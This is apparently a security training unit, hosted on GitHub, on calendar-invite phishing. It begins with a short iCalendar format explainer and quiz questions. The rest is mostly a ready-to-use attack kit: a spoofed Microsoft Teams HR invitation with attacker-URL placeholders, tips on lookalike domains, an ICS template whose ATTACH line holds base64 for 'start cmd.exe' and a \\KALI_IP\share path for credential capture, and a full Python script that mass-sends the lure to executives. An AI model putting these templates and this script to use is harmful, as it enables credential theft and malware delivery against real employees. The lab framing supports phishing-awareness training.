The iCalendar (ICS) standard is a widely-adopted format for representing calendar data, facilitating the exchange of information about events, to-dos, and journal entries in a consistent manner. Defined by the Internet Engineering Task Force (IETF) in RFC 5545, this standard promotes interoperability among various calendaring systems such as Google Calendar, Microsoft Outlook, and Apple Calendar.

An ICS file is essentially a plain text file that follows a specific syntax to represent calendar events. It begins with a header indicating the version and method of the calendar data being shared, and its main structure consists of components such as VEVENT for calendar events,
VTODO for to-do items, and VJOURNAL for journal entries.

format and fileds key value:

ORGANIZER;CN="John Doe":mailto:johndoe@example.com
DTSTART;TZID=America/New_York:20231015T090000
DTEND;TZID=America/New_York:20231015T100000
DESCRIPTION:Weekly team meeting to discuss project updates and milestones.

What does the DTSTART property in an ICS file define?
A) The organizer's email address
B) The event description
C) The event start time
D) The event location
Copy
How are properties in an ICS file organized?
A) In a hierarchical tree structure
B) As JSON objects
C) As key-value pairs, each on a new line
D) As XML tags


### Creating a Custom Calendar Invite with [Sendmail](https://www.kali.org/tools/sendemail/)

1- Customs email body template.html
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Test</title>
</head>
<body>
    <p>Hello,</p>
    <p>This is a test email</p>
    <p>Best regards,<br>Attacker</p>
</body>
</html>
```

2- ICS template as iCalendar.ics
```
BEGIN:VCALENDAR
PRODID:Microsoft Exchange Server 2022
VERSION:2.0
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VTIMEZONE
TZID:UTC
BEGIN:STANDARD
DTSTART:20241010T073659Z
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:STANDARD
END:VTIMEZONE
BEGIN:VEVENT
DTSTART;TZID=UTC:20241010T073059Z
DTEND;TZID=UTC:20241010T083059Z
DTSTAMP:20241010T034159Z
ORGANIZER;CN=Peter:mailto:peter@corp1.com
UID:FIXMEUID20241010T034159Z
CREATED:20241010T034159Z
DESCRIPTION:http://meeting.corp1.com
LAST-MODIFIED:20241010T034159Z
LOCATION:Microsoft Teams Meeting
SEQUENCE:0
STATUS:CONFIRMED
SUMMARY:HR meeting
TRANSP:OPAQUE
END:VEVENT
END:VCALENDAR

```

`┌──(kali㉿kali)-[~/Projects]
└─$ sendemail -s victim_ip:1025 -t victim@outlook.com -f attacker@corp1.com -u "test"  -o message-content-type=html -o message-file=./template.html -a icalendar.ics
`
you can download [MailHog](https://github.com/mailhog/MailHog/releases) on windows for an smtp server

<img width="1134" height="574" alt="image" src="https://github.com/user-attachments/assets/8870fe61-7b1a-4120-bd9e-39916771a907" />
<img width="1291" height="732" alt="image" src="https://github.com/user-attachments/assets/d5d9d747-722d-4a7a-901b-e4c26cc7b866" />


### This Learning Unit covers the following Learning Objectives:

Crafting a Calendar Phishing email.
Automating the Calendar phishing attack.
Credential Stealing with Responder

Change every [ATTACKER_URL]. Real phishings campaign attacker url will be a fake domain that compromise user credential or any private information. For instance, using similar-looking characters (like "1" instead of "l" or "0" instead of "o") or slight variations in spelling can help increase the likelihood that recipients will not notice the difference 
```
<p class=MsoNormal style='background:white'><span style='color:black'>We are reaching out to inform you of an urgent meeting scheduled by the HR Department that requires your immediate attention.<u1:p>&nbsp;<o:p></o:p></span></u1:p></p>
<p class=MsoNormal style='background:white'><span style='color:#5F5F5F'>________________________________________________________________________________</span><span style='mso-fareast-font-family:"Times New Roman";color:black'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-size:18.0pt; font-family:"Segoe UI",sans-serif;color:#252424'>Microsoft Teams meeting</span><span style='font-family:"Segoe UI",sans-serif;color:#252424'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><b><span style='font-size:10.5pt; font-family:"Segoe UI",sans-serif;color:#252424'>Join on your computer or mobile app</span></b><b><span style='font-family:"Segoe UI",sans-serif; color:#252424'> <u1:p>&nbsp;</u1:p></span></b><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-family:"Segoe UI",sans-serif; color:#252424'><a href="[ATTACKER_URL]" target="_blank"><span style='font-size:10.5pt;font-family:"Segoe UI Semibold",sans-serif; color:#6264A7'>Click here to join the meeting</span></a> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-family:"Segoe UI",sans-serif; color:#252424'><a href="[ATTACKER_URL]" target="_blank"><span style='font-size:10.5pt;color:#6264A7'>Learn More</span></a> | <a href="[ATTACKER_URL]" target="_blank"><span style='font-size:10.5pt;color:#6264A7'>Meeting options</span></a><u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='color:#5F5F5F'><span style='opacity:.36'>________________________________________________________________________________</span></span><span style='mso-fareast-font-family:"Times New Roman";color:black'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>

```

## Automating the Attack

This is a fake Microsoft Teams meeting invitation phishing campaign. The attacker uses a Python script to automatically generate and send an email that looks like a legitimate HR meeting invite.

The email contains:

An HTML body mimicking a Microsoft Teams meeting, with a malicious link hidden behind a "Click here to join the meeting" button.

An ICS calendar attachment (invite.ics) that also contains the malicious URL in its description. Because the email looks like a legitimate Outlook/Exchange calendar invite, it bypasses many email filters and appears highly credible to the victim.

When the victim clicks the link in the email body or the calendar invite, they are redirected to the attacker's payload (e.g., a credential harvester or malware download).

📁 The Final Templates and Script to Resume
Below are the complete files needed to replicate this campaign.

1. HTML Email Template (email_template.html)
```
<p class=MsoNormal style='background:white'><span style='color:black'>{EVENT_TEXT}<u1:p>&nbsp;<o:p></o:p></span></u1:p></p>
<p class=MsoNormal style='background:white'><span style='color:#5F5F5F'>________________________________________________________________________________</span><span style='mso-fareast-font-family:"Times New Roman";color:black'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-size:18.0pt; font-family:"Segoe UI",sans-serif;color:#252424'>Microsoft Teams meeting</span><span style='font-family:"Segoe UI",sans-serif;color:#252424'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><b><span style='font-size:10.5pt; font-family:"Segoe UI",sans-serif;color:#252424'>Join on your computer or mobile app</span></b><b><span style='font-family:"Segoe UI",sans-serif;color:#252424'> <u1:p>&nbsp;</u1:p></span></b><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-family:"Segoe UI",sans-serif;color:#252424'><a href="{EVENT_URL}" target="_blank"><span style='font-size:10.5pt;font-family:"Segoe UI Semibold",sans-serif;color:#6264A7'>Click here to join the meeting</span></a> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='font-family:"Segoe UI",sans-serif;color:#252424'><a href="https://aka.ms/JoinTeamsMeeting" target="_blank"><span style='font-size:10.5pt;color:#6264A7'>Learn More</span></a> | <a href="{EVENT_URL}" target="_blank"><span style='font-size:10.5pt;color:#6264A7'>Meeting options</span></a><u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
<p class=MsoNormal style='background:white'><span style='color:#5F5F5F'><span style='opacity:.36'>________________________________________________________________________________</span></span><span style='mso-fareast-font-family:"Times New Roman";color:black'> <u1:p>&nbsp;</u1:p></span><span style='color:black'><o:p></o:p></span></p>
```

2. ICS Calendar Template (iCalendar_template.ics)
```
BEGIN:VCALENDAR
PRODID:Microsoft Exchange Server 2022
VERSION:2.0
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VTIMEZONE
TZID:UTC
BEGIN:STANDARD
DTSTART:{DTSTART}
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:STANDARD
BEGIN:DAYLIGHT
DTSTART:{DTSTART}
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:DAYLIGHT
END:VTIMEZONE
BEGIN:VEVENT
DTSTART;TZID=UTC:{DTSTART}
DTEND;TZID=UTC:{DTEND}
DTSTAMP:{DTSTAMP}
ORGANIZER;CN={ORGANIZER_NAME}:mailto:{ORGANIZER_EMAIL}
ATTACH;FMTTYPE=application/octet-stream;ENCODING=BASE64:\c3RhcnQgY21kLmV4ZQo= // or ATTACH;FMTTYPE=application/octet-stream:\\KALI_IP\share
UID:FIXMEUID{DTSTAMP}
{ATTENDEES}
CREATED:{DTSTAMP}
DESCRIPTION:{DESCRIPTION}
LAST-MODIFIED:{DTSTAMP}
LOCATION:Microsoft Teams Meeting
SEQUENCE:0
STATUS:CONFIRMED
SUMMARY:{SUMMARY}
TRANSP:OPAQUE
END:VEVENT
END:VCALENDAR
```

3. Python Script (fakeics.py)

```
import time
import codecs
import smtplib
import datetime
import sys
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.encoders import encode_base64
from email.mime.multipart import MIMEMultipart
from email.utils import COMMASPACE, formatdate

# email settings
EMAIL_SUBJECT = "HR Meeting"

# event settings
EVENT_SUMMARY = "HR meeting"
ORGANIZER_NAME = "HR Team Corp1"
ATTENDEES = ["ceo@corp1.com", "cto@corp1.com"]

# template settings
EVENT_TEXT = """
Dear colleague,

We would like to inform you about an important HR meeting regarding recent company-wide changes and policies. Your attendance is highly encouraged as we will be discussing essential updates that impact all employees.

Topics will include:

- Organizational restructuring
- New employee benefits package
- Updates to leave policies
- Changes to the remote work policy

This meeting is a priority and will be your opportunity to ask any questions or raise concerns.

We look forward to your participation.

Best regards,
HR Team
"""

def load_template():
    template = ""
    with codecs.open("email_template.html", 'r', 'utf-8') as f:
        template = f.read()
    return template

def prepare_template(event_url):
    email_template = load_template()
    email_template = email_template.format(EVENT_TEXT=EVENT_TEXT, EVENT_URL=event_url)
    return email_template

def load_ics():
    ics = ""
    with codecs.open("iCalendar_template.ics", 'r', 'utf-8') as f:
        ics = f.read()
    return ics

def prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url):
    ics_template = load_ics()
    ics_template = ics_template.format(
        DTSTAMP=dtstamp,
        DTSTART=dtstart,
        DTEND=dtend,
        ORGANIZER_NAME=ORGANIZER_NAME,
        ORGANIZER_EMAIL=sender_email,
        DESCRIPTION=event_url,  # Use event_url as DESCRIPTION
        SUMMARY=EVENT_SUMMARY,
        ATTENDEES=generate_attendees()
    )
    return ics_template

def generate_attendees():
    attendees = []
    for attendee in ATTENDEES:
        attendees.append(
            "ATTENDEE;CUTYPE=INDIVIDUAL;ROLE=REQ-PARTICIPANT;PARTSTAT=ACCEPTED;RSVP=FALSE\r\n ;CN={attendee};X-NUM-GUESTS=0:\r\n mailto:{attendee}".format(attendee=attendee)
        )
    return "\r\n".join(attendees)

def send_email(smtp_server, sender_email, to, event_url):
    print('Sending email to: ' + to)

    # in .ics file timezone is set to be utc
    utc_offset = time.localtime().tm_gmtoff / 60
    ddtstart = datetime.datetime.now()
    dtoff = datetime.timedelta(minutes=utc_offset + 5)  # meeting has started 5 minutes ago
    duration = datetime.timedelta(hours=1)  # meeting duration
    ddtstart = ddtstart - dtoff
    dtend = ddtstart + duration
    dtstamp = datetime.datetime.now().strftime("%Y%m%dT%H%M%SZ")
    dtstart = ddtstart.strftime("%Y%m%dT%H%M%SZ")
    dtend = dtend.strftime("%Y%m%dT%H%M%SZ")

    ics = prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url)
    email_body = prepare_template(event_url)

    msg = MIMEMultipart('mixed')
    msg['Reply-To'] = sender_email
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = EMAIL_SUBJECT
    msg['From'] = sender_email
    msg['To'] = to

    part_email = MIMEText(email_body, "html")
    part_cal = MIMEText(ics, 'calendar;method=REQUEST')

    msgAlternative = MIMEMultipart('alternative')
    msg.attach(msgAlternative)

    ics_atch = MIMEBase('application/ics', ' ;name="%s"' % ("invite.ics"))
    ics_atch.set_payload(ics)
    encode_base64(ics_atch)
    ics_atch.add_header('Content-Disposition', 'attachment; filename="%s"' % ("invite.ics"))

    eml_atch = MIMEBase('text/plain', '')
    eml_atch.set_payload("")
    encode_base64(eml_atch)
    eml_atch.add_header('Content-Transfer-Encoding', "")

    msgAlternative.attach(part_email)
    msgAlternative.attach(part_cal)

    mailServer = smtplib.SMTP(smtp_server, 25)
    mailServer.ehlo()
    mailServer.ehlo()
    mailServer.sendmail(sender_email, to, msg.as_string())
    mailServer.close()

def main():
    if len(sys.argv) != 5:
        print("Usage: python fakeics.py <smtp_server> <sender_email> <recipient_email> <event_url>")
        sys.exit(1)

    smtp_server = sys.argv[1]
    sender_email = sys.argv[2]
    recipient_email = sys.argv[3]
    event_url = sys.argv[4]

    send_email(smtp_server, sender_email, recipient_email, event_url)

if __name__ == "__main__":
    main()
```

🚀 How to Resume / Run It
Prepare Files: Place email_template.html, iCalendar_template.ics, and fakeics.py in the same directory on your Kali machine.

Start a Listener/Web Server: Make sure your payload or credential harvester is hosted on the event_url you provide.

Run the Script: Execute the Python script with the required arguments:
```
python3 fakeics.py <smtp_server_IP> <sender_email> <recipient_email> <event_url>
```
> Note: The script connects to the SMTP server on port 25. Ensure your SMTP relay (e.g., a local Postfix or a mail server in your lab) is configured to accept unauthenticated emails from your Kali machine for this to work in a lab environment.

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/55c2a2b9-b16e-4af4-a2bb-4dec0f5d4edf" />

